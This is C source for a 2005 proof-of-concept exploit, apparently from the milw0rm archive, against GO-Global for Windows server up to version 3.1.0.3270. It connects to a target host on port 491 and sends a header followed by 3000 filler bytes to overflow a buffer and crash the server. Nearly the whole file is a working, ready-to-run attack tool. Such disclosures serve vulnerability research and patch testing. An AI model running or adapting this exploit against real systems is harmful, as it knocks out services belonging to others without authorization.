/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

// inserted winerr.h /str0ke

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER     "0.1"
#define PORT    491
#define BOFSZ   3000
#define GGWXP   "_USERSA_"
#define GGWXPSZ (sizeof(GGWXP) - 1)



u_int resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            len;
    u_short port = PORT;
    u_char  buff[GGWXPSZ + 2 + BOFSZ],
            *p;

#ifdef WIN32
    WSADATA wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    setbuf(stdout, NULL);

    fputs("\n"
        "GO-Global for Windows server <= 3.1.0.3270 buffer-overflow "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    p = buff;
    memcpy(p, GGWXP, GGWXPSZ);
    p += GGWXPSZ;

    *(u_short *)p = htons(BOFSZ);
    p += 2;
    memset(p, 'a', BOFSZ);
    p += BOFSZ;
    send(sd, buff, p - buff, 0);

    len = recv(sd, buff, sizeof(buff), 0);
    close(sd);

    if(len <= 0) {
        fputs("- server has terminated the connection, it is probably vulnerable\n", stdout);
    } else {
        if(len > GGWXPSZ) len = GGWXPSZ;
        if(memcmp(buff, GGWXP, len)) {
            fputs("- this server is not a valid GO-Global for Windows server\n", stdout);
            exit(1);
        }
    }

    fputs("- the server should be crashed, check it manually\n", stdout);
    return(0);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

// milw0rm.com [2005-11-02]
